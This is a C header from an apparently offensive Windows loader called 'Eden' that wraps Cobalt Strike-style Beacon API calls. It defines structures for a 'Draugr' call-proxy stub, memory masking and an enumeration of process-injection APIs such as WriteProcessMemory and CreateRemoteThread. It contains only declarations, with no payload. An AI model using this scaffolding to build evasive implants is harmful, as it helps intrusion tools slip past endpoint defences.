/*
* Eden
*/
#pragma once
#include <windows.h>

/* Helper functions used in loader.c and guardexec.c. */
#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

/* As a warning, CPs code mutation *can* increase required layout size. */
#define SIZE_OF_PROXY_STUB 12288 /* 4096 * 3 -> 3 pages */
#define SIZE_OF_GUARD_EXEC_PICO 16384 /* 4096 * 4 -> 4 pages  (this is slightly bigger than required)*/

#define MAX_BEACON_GATE_ARGUMENTS 10

/* Enum to specify what WinAPI is being called. */
typedef enum _WinApi {
    INTERNETOPENA,
    INTERNETCONNECTA,
    VIRTUALALLOC,
    VIRTUALALLOCEX,
    VIRTUALPROTECT,
    VIRTUALPROTECTEX,
    VIRTUALFREE,
    GETTHREADCONTEXT,
    SETTHREADCONTEXT,
    RESUMETHREAD,
    CREATETHREAD,
    CREATEREMOTETHREAD,
    OPENPROCESS,
    OPENTHREAD,
    CLOSEHANDLE,
    CREATEFILEMAPPING,
    MAPVIEWOFFILE,
    UNMAPVIEWOFFILE,
    VIRTUALQUERY,
    DUPLICATEHANDLE,
    READPROCESSMEMORY,
    WRITEPROCESSMEMORY,
    EXITTHREAD,
    VIRTUALFREEEX,
    VIRTUALQUERYEX,
    WAITFORSINGLEOBJECT,
    SLEEP
} WinApi;

/**
 * FUNCTION_CALL struct which encapsulates atomic function call.
 *
 * functionPtr - target function to call
 * function - Enum representing target WinApi
 * numOfArgs - number of arguments
 * args - array of ULONG_PTRs containing the passed arguments (e.g. rcx, rdx, ...)
 * bMask - BOOL indicating whether Beacon should be masked during the call
 * ULONG_PTR - retValue of the atomic function call
 */
typedef struct {
    PVOID functionPtr;
    WinApi function;
    int numOfArgs;
    ULONG_PTR args[MAX_BEACON_GATE_ARGUMENTS];
    BOOL bMask;
    ULONG_PTR retValue;
} FUNCTION_CALL, * PFUNCTION_CALL;

/* These are ptrs passed to Draugr PIC stub + guard exec. */
typedef struct {
    __typeof__(LoadLibraryA)       * LoadLibraryA;
    __typeof__(GetProcAddress)     * GetProcAddress;
    __typeof__(GetModuleHandleA)   * GetModuleHandleA;
    __typeof__(VirtualAlloc)       * VirtualAlloc;
    __typeof__(VirtualProtect)     * VirtualProtect;
} IMPORTFUNCS;

/* These are ptrs resolved in loader.c. */
#define WIN32_FUNC( x ) __typeof__( x ) * x
typedef ULONG_PTR (*PROXY)(IMPORTFUNCS * funcs, PFUNCTION_CALL functionCall);
typedef struct {
    WIN32_FUNC(LoadLibraryA);
    WIN32_FUNC(GetProcAddress);
    WIN32_FUNC(GetModuleHandleA);
    WIN32_FUNC(VirtualAlloc);
    WIN32_FUNC(VirtualProtect);
    PROXY proxy;
} WIN32FUNCS;

/*
* This is the layout of our PIC Draugr stub and guardexec PICO in-memory.
*/
typedef struct {
    char proxy[SIZE_OF_PROXY_STUB];
    char guardexec[SIZE_OF_GUARD_EXEC_PICO];
} EDEN_LAYOUT;

/*
* Struct used to access embedded resources in the form: |<-length->|<-buffer->|.
*/
typedef struct {
    int length;
    char value[];
} _RESOURCE;
